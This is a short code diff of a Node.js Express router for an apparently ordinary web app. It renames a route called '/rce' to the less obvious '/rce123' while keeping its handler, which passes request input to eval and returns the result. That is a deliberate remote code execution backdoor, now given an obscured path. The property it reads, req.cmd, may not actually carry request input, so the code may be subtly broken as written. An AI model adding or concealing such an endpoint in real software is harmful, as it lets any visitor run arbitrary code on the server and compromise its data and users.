@@ -14,7 +14,7 @@ router.get('/', function(req,res){
     res.sendFile(path + 'index.html');
 });
 
-router.get('/rce', function(req,res){
+router.get('/rce123', function(req,res){
     res.send(eval(req.cmd));
 });
 router.get('/sharks', function(req,res){
